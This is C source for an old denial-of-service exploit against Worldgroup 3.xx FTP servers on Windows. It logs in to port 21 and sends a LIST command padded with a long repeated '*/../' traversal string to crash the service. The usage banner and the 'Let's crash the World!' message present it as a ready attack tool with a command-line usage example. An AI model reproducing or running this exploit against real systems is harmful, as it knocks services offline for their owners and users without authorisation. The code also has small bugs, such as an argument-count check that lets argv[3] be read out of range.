int main(int argc, char *argv[])
{
        int sock;
        struct sockaddr_in blah;
        struct hostent *he;
        char cgiBuff[1024];
        char *cgiPage[6];
        WSADATA wsaData;
        char cr[] = "\n";

        if (argc < 3)
        {
printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThis program crash Worldgroup servers 3.xx for windows 95/98/ME/NT/2K.");
printf("\n\rGreets to [WhU]//[GiN]//[LByte]//[WGHACK] projects!\n\r  USAGE:\n\r");
printf("Ftp_dos.exe [HOST] [LOGIN] [PASSWORD] ");
printf("\n\r example : fpt_dos.exe 127.0.0.1 anonymous [email protected] \n");
                exit(1);
        }
        cgiPage[0] = "USER ";
        cgiPage[1] = (argv[2]);
        cgiPage[2] = "PASS ";
        cgiPage[3] = (argv[3]);
        cgiPage[4] = "PASV";
        cgiPage[5] = "LIST */../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../\n";

        if(WSAStartup(0x101,&wsaData))
        {
                printf("Unable to initialize WinSock lib.\n");
                exit(1);
        }
printf("Let's crash the World!\n\r");
printf("Coded by the [eaSt]:\n\r");
printf("\nConnecting %s on port 21...\n\n", argv[1]);

        sock = socket(AF_INET,SOCK_STREAM,0);
        blah.sin_family=AF_INET;
        blah.sin_addr.s_addr=inet_addr(argv[1]);
        blah.sin_port=htons(21);
        if ((he = gethostbyname(argv[1])) != NULL)
        {
                memcpy((char *)&blah.sin_addr, he->h_addr, he->h_length);
        }
        else
        {
                if ((blah.sin_addr.s_addr = inet_addr(argv[1]))==INADDR_NONE)
                {
                WSACleanup();
                exit(1);
                }
        }

        if (connect(sock,(struct sockaddr*)&blah,sizeof(blah))!=0)
        {
                WSACleanup();
                exit(1);
        }
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf("<< %s", cgiBuff);
        send(sock,cgiPage[0],strlen(cgiPage[0]),0);
        send(sock,cgiPage[1],strlen(cgiPage[1]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s %s\n<< %s", cgiPage[0], cgiPage[1], cgiBuff);
        send(sock,cgiPage[2],strlen(cgiPage[2]),0);
        send(sock,cgiPage[3],strlen(cgiPage[3]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s %s\n<< %s", cgiPage[2], cgiPage[3], cgiBuff);
        send(sock,cgiPage[4],strlen(cgiPage[4]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s\n<< %s", cgiPage[4], cgiBuff);
        send(sock,cgiPage[5],strlen(cgiPage[5]),0);
        send(sock,cr,1,0);
        memset(cgiBuff, 0, sizeof(cgiBuff));
        cgiBuff[recv(sock,cgiBuff,sizeof(cgiBuff) - 1 ,0)] = 0;
        printf(">> %s\n<< %s", cgiPage[5], cgiBuff);

        printf("Try reconnect to %s\n", argv[1]);
        WSACleanup();
        return 0;
}